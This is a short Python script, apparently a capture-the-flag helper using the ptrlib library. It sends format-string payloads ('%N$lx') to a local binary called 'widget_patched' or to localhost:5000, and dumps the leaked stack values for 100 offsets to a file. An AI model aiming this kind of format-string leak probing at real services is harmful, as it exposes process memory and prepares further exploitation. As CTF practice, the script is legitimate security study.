#!/usr/bin/env python
import ptrlib as ptr
import sys

elf = ptr.ELF("./widget_patched")
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return ptr.Socket("localhost", 5000)
    else:
        return ptr.Process(elf.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    dump = ""
    for i in range(100):
        io = connect()
        payload = f"#%{i+1}$lx#"
        io.sendline(str(len(payload)).encode())
        io.sendline(payload.encode())
        io.recvuntil(b"#")
        # leak = ptr.u64(io.recvuntil(b"#").strip(b"#"))
        leak = io.recvuntil(b"#").strip(b"#").decode()
        dump += f"{i + 1}: {leak}\n"

        io.close()

    with open("dump.txt", "w") as f:
        f.write(dump)


if __name__ == "__main__":
    main()
